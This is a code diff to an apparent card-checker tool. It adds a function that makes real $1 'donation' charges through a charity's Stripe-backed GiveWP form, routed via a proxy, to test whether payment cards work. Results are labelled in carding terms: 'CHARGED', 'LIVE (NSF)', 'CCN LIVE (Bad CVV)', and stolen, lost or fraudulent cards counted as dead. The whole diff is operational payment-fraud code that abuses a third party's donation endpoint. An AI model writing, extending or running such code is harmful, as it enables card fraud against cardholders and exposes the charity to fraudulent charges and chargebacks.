@@ -1408,7 +1408,15 @@ async def mosds_donation_gateway_check(
 ) -> dict:
     """
     Check card using MOSDS.org GiveWP donation form with Stripe.
-    This gateway uses a real donation form with embedded Stripe.
+    This gateway creates a real $1 donation charge to verify the card.
+
+    Process:
+    1. Create PaymentMethod with card details
+    2. Create PaymentIntent with $1 charge
+    3. Confirm the charge
+    4. Return result (charged, declined, NSF, etc.)
+
+    Note: This charges $1 to the card as a real donation.
     """
     import aiohttp
     import secrets
@@ -1519,29 +1527,139 @@ async def mosds_donation_gateway_check(
                         if logger:
                             logger.debug(f"[MOSDS] PaymentMethod created: {pm_id}")
 
-                        # Step 2: Simulate donation submission to GiveWP
-                        # We'll use the Stripe PaymentIntent creation directly
-                        # since we have the PM ID
-
                         # Get card details from PM response
                         card_data = pm_json.get("card", {})
                         brand = card_data.get("brand", "CARD").upper()
                         funding = card_data.get("funding", "credit").upper()
                         country = card_data.get("country", "")
 
-                        # For MOSDS, we just need to verify the PM was created successfully
-                        # This means the card is valid
-                        return {
-                            "success": True,
-                            "message": f"✅ LIVE: {brand} {funding} •••• {card_last4}",
-                            "gateway_message": "Card validated via MOSDS donation form",
-                            "status": "approved",
-                            "card_last4": card_last4,
-                            "brand": brand,
-                            "card_type": funding,
-                            "country": country,
-                            "gateway": "mosds"
+                        # Step 2: Create PaymentIntent with $1 donation charge
+                        if logger:
+                            logger.debug(f"[MOSDS] Creating $1 donation PaymentIntent...")
+
+                        pi_data = {
+                            "amount": "100",  # $1.00 in cents
+                            "currency": "usd",
+                            "payment_method": pm_id,
+                            "confirm": "true",
+                            "description": "Donation to MOSDS",
+                            "statement_descriptor": "MOSDS DONATION",
+                            "return_url": f"{site_url}/donate/",
                         }
+
+                        async with session.post(
+                            "https://api.stripe.com/v1/payment_intents",
+                            data=pi_data,
+                            headers=headers,
+                            proxy=proxy_url
+                        ) as pi_resp:
+                            pi_text = await pi_resp.text()
+
+                            try:
+                                pi_result = json.loads(pi_text)
+                            except:
+                                return {"success": False, "error": "Invalid PaymentIntent response"}
+
+                            # Get status and error info
+                            status = pi_result.get("status", "")
+                            error = pi_result.get("error", {})
+                            last_payment_error = pi_result.get("last_payment_error", {})
+                            next_action = pi_result.get("next_action", {})
+
+                            # Get error message
+                            error_msg = error.get("decline_code") or error.get("message") or ""
+                            if not error_msg and last_payment_error:
+                                error_msg = last_payment_error.get("decline_code") or last_payment_error.get("message") or ""
+                            error_msg = error_msg.lower() if error_msg else ""
+
+                            # Get risk level from charge if available
+                            risk_level = ""
+                            receipt_url = ""
+                            try:
+                                latest_charge = pi_result.get("latest_charge", {})
+                                if isinstance(latest_charge, dict):
+                                    risk_level = latest_charge.get("outcome", {}).get("risk_level", "")
+                                    receipt_url = latest_charge.get("receipt_url", "")
+                            except:
+                                pass
+
+                            # ✅ CHARGED - Success!
+                            if status == "succeeded":
+                                return {
+                                    "success": True,
+                                    "message": f"✅ CHARGED ($1): {brand} {funding} •••• {card_last4}",
+                                    "gateway_message": f"$1 donation charged | Risk: {risk_level} | {country}",
+                                    "status": "charged",
+                                    "card_last4": card_last4,
+                                    "brand": brand,
+                                    "card_type": funding,
+                                    "country": country,
+                                    "risk_level": risk_level,
+                                    "receipt_url": receipt_url,
+                                    "gateway": "mosds"
+                                }
+
+                            # 🔐 3DS Required
+                            if status == "requires_action" or next_action.get("type") == "use_stripe_sdk":
+                                return {
+                                    "success": False,
+                                    "error": "3DS Required",
+                                    "gateway_message": f"Card requires 3D Secure | Risk: {risk_level}",
+                                    "status": "3ds",
+                                    "card_last4": card_last4,
+                                    "brand": brand,
+                                }
+
+                            # ✅ Insufficient funds = LIVE card
+                            if "insufficient_funds" in error_msg or "insufficient funds" in error_msg:
+                                return {
+                                    "success": True,
+                                    "message": f"✅ LIVE (NSF): {brand} {funding} •••• {card_last4}",
+                                    "gateway_message": f"Insufficient funds | Risk: {risk_level}",
+                                    "status": "charged",
+                                    "card_last4": card_last4,
+                                    "brand": brand,
+                                    "card_type": funding,
+                                    "country": country,
+                                }
+
+                            # ✅ Incorrect CVC = CCN LIVE
+                            if "incorrect_cvc" in error_msg or "security code" in error_msg:
+                                return {
+                                    "success": True,
+                                    "message": f"✅ CCN LIVE (Bad CVV): {brand} {funding} •••• {card_last4}",
+                                    "gateway_message": f"Incorrect CVC | Risk: {risk_level}",
+                                    "status": "ccn_live",
+                                    "card_last4": card_last4,
+                                    "brand": brand,
+                                    "card_type": funding,
+                                    "country": country,
+                                }
+
+                            # ❌ Dead cards
+                            if "do_not_honor" in error_msg:
+                                return {"success": False, "error": "Do Not Honor", "status": "declined", "risk_level": risk_level}
+                            if "stolen_card" in error_msg or "stolen card" in error_msg:
+                                return {"success": False, "error": "Stolen Card", "status": "declined", "risk_level": risk_level}
+                            if "lost_card" in error_msg or "lost card" in error_msg:
+                                return {"success": False, "error": "Lost Card", "status": "declined", "risk_level": risk_level}
+                            if "expired" in error_msg:
+                                return {"success": False, "error": "Expired Card", "status": "declined", "risk_level": risk_level}
+                            if "fraudulent" in error_msg:
+                                return {"success": False, "error": "Fraudulent", "status": "declined", "risk_level": risk_level}
+                            if "generic_decline" in error_msg:
+                                return {"success": False, "error": "Generic Decline", "status": "declined", "risk_level": risk_level}
+                            if "declined" in error_msg or "card_declined" in error_msg:
+                                return {"success": False, "error": "Declined", "status": "declined", "risk_level": risk_level}
+
+                            # Unknown error
+                            return {
+                                "success": False,
+                                "error": error_msg[:50] if error_msg else f"Status: {status}",
+                                "gateway_message": error_msg or pi_text[:100],
+                                "status": "declined",
+                                "risk_level": risk_level,
+                            }
 
                     except json.JSONDecodeError:
                         last_error = {"success": False, "error": "Invalid API response"}
